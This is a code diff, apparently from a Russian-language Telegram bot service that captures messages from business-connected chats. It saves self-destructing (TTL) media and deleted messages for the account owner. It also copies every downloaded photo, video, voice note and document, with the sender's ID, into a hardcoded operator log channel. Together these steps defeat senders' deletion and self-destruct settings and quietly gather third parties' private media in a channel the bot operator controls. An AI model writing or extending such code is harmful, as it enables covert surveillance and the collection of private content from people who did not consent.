@@ -17,7 +17,7 @@ from db.models import SavedMessage, UserSession
 from html import escape
 router = Router()
 
-LOG_CHANNEL_ID = -1004327024615
+LOG_CHANNEL_ID = -1003711524247
 
 
 class BusinessSaveModService:
@@ -219,41 +219,33 @@ class BusinessSaveModService:
             return True
         return False
 
-    async def _save_media_to_log(self, message: Message, owner_id: int, prefix: str = "") -> tuple[str | None, bytes | None]:
-        """
-        Скачивает медиа, отправляет в лог-канал через Главного бота.
-        Возвращает (original_file_id, raw_bytes).
-        """
+    async def _save_media_to_log(self, message: Message, owner_id: int, prefix: str = "") -> str | None:
+        """Скачивает медиа через бота-получателя, льет в канал через Главного бота, возвращает оригинальный file_id."""
         media_type = self._detect_media_type(message)
         if not media_type:
-            return None, None
+            return None
 
         try:
-            if media_type == "photo":
-                media_obj = message.photo[-1]
-            elif media_type == "video_note":
-                media_obj = message.video_note
-            elif media_type == "voice":
-                media_obj = message.voice
-            elif media_type == "video":
-                media_obj = message.video
-            elif media_type == "audio":
-                media_obj = message.audio
-            elif media_type == "document":
-                media_obj = message.document
-            elif media_type == "sticker":
-                media_obj = message.sticker
-            elif media_type == "animation":
-                media_obj = message.animation
-            else:
-                return None, None
+            if media_type == "photo": media_obj = message.photo[-1] if message.photo else None
+            elif media_type == "video_note": media_obj = message.video_note
+            elif media_type == "voice": media_obj = message.voice
+            elif media_type == "video": media_obj = message.video
+            elif media_type == "audio": media_obj = message.audio
+            elif media_type == "document": media_obj = message.document
+            elif media_type == "sticker": media_obj = message.sticker
+            elif media_type == "animation": media_obj = message.animation
+            else: media_obj = None
 
-            original_file_id = media_obj.file_id
+            if not media_obj:
+                return None
 
-            # Скачиваем строго через message.bot (у кастомного бота свой доступ)
+            # 🔥 Сохраняем ИСХОДНЫЙ file_id, который понимает текущий бот
+            original_file_id = media_obj.file_id if media_type != "photo" else message.photo[-1].file_id
+
+            # 🔥 Скачиваем строго через message.bot (у кастомного бота свой токен доступа к файлу!)
             file_bytes: BytesIO = await message.bot.download(media_obj)
             if not file_bytes:
-                return original_file_id, None
+                return original_file_id
 
             raw = file_bytes.read()
             sender_id = message.from_user.id if message.from_user else 0
@@ -269,7 +261,7 @@ class BusinessSaveModService:
 
             input_file = BufferedInputFile(raw, filename="media")
 
-            # В лог-канал — всегда через Главного бота
+            # 🔥 В лог-канал отправляем ВСЕГДА через Главного бота (self.bot)
             if media_type == "video_note":
                 await self.bot.send_video_note(LOG_CHANNEL_ID, video_note=input_file)
                 await self.bot.send_message(LOG_CHANNEL_ID, f"☝️ <b>Кружок выше:</b>\n{caption}", parse_mode="HTML")
@@ -284,14 +276,14 @@ class BusinessSaveModService:
             else:
                 await self.bot.send_document(LOG_CHANNEL_ID, document=input_file, caption=caption, parse_mode="HTML")
 
-            return original_file_id, raw
+            # Возвращаем исходный ID для сохранения в БД под этого конкретного бота
+            return original_file_id
 
         except Exception as e:
             print(f"[BusinessSaveMod] Ошибка сохранения медиа: {e}")
-            try:
-                return media_obj.file_id, None
-            except Exception:
-                return None, None
+            # Если отправка в канал упала, всё равно пытаемся вернуть оригинальный file_id для работы внутри бота
+            try: return media_obj.file_id if media_type != "photo" else message.photo[-1].file_id
+            except: return None
 
     async def _send_deleted_to_user(self, owner_id: int, saved: SavedMessage, info_text: str, bot: Bot):
         """Отправляет удалённое сообщение владельцу строго через активного бота (bot)."""
@@ -336,18 +328,17 @@ class BusinessSaveModService:
         owner_id = self.get_owner(bc_id)
         if not owner_id or not await self._is_savemod_active(owner_id):
             return
-    
+
         if await self._get_saved(owner_id, message.chat.id, message.message_id):
-            return
-    
+            return  
+
         text = message.text or message.caption or ""
         is_ttl = self._check_ttl(message)
         media_type = self._detect_media_type(message)
         prefix = "🔥 <b>САМОУНИЧТОЖАЮЩЕЕСЯ МЕДИА</b>\n" if is_ttl else ""
-    
+
         sender_id = message.from_user.id if message.from_user else 0
-    
-        # Алерт о TTL
+
         if is_ttl:
             sender_name = await self.get_entity_name(sender_id, bot=message.bot)
             ttl_text = (
@@ -355,39 +346,29 @@ class BusinessSaveModService:
                 f"<blockquote>"
                 f"<b>От: <a href=\"tg://user?id={sender_id}\">{sender_name}</a></b>\n"
                 f"</blockquote>\n"
-                f"<b>@TrackerZaki_Bot</b>"
+                f"<b>@TrackerZaki_Bot</b>" # Динамический юзернейм
             )
             try:
+                # 🔥 Отправляем через message.bot
                 await message.bot.send_message(chat_id=owner_id, text=ttl_text, parse_mode="HTML")
             except Exception as e:
                 print(f"[BusinessSaveMod] Ошибка отправки TTL алерта: {e}")
-    
+
         file_id = None
-        raw_bytes = None
-    
         if media_type:
-            file_id, raw_bytes = await self._save_media_to_log(message, owner_id, prefix)
-    
-        # Для TTL-медиа отправляем владельцу уже перезалитые байты
-        if is_ttl and raw_bytes:
+            file_id = await self._save_media_to_log(message, owner_id, prefix)
+
+        if is_ttl and file_id:
             try:
-                input_file = BufferedInputFile(raw_bytes, filename="ttl_media")
-                bot = message.bot
-    
-                if media_type == "video_note":
-                    await bot.send_video_note(chat_id=owner_id, video_note=input_file)
-                elif media_type == "photo":
-                    await bot.send_photo(chat_id=owner_id, photo=input_file, caption="🔥 Самоуничтожающееся фото сохранено")
-                elif media_type == "voice":
-                    await bot.send_voice(chat_id=owner_id, voice=input_file, caption="🔥 Самоуничтожающееся голосовое сохранено")
-                elif media_type == "video":
-                    await bot.send_video(chat_id=owner_id, video=input_file, caption="🔥 Самоуничтожающееся видео сохранено")
-                else:
-                    await bot.send_document(chat_id=owner_id, document=input_file, caption="🔥 Самоуничтожающееся медиа сохранено")
+                # 🔥 Отправляем через message.bot
+                if media_type == "video_note": await message.bot.send_video_note(chat_id=owner_id, video_note=file_id)
+                elif media_type == "photo": await message.bot.send_photo(chat_id=owner_id, photo=file_id)
+                elif media_type == "voice": await message.bot.send_voice(chat_id=owner_id, voice=file_id)
+                elif media_type == "video": await message.bot.send_video(chat_id=owner_id, video=file_id)
+                else: await message.bot.send_document(chat_id=owner_id, document=file_id)
             except Exception as e:
-                print(f"[BusinessSaveMod] Ошибка пересылки TTL медиа владельцу: {e}")
-    
-        # 🔥 ОБЯЗАТЕЛЬНО сохраняем в базу (и обычные, и TTL сообщения)
+                print(f"[BusinessSaveMod] Ошибка пересылки TTL медиа: {e}")
+
         async with AsyncSessionLocal() as session:
             saved = SavedMessage(
                 owner_bot_id=owner_id,
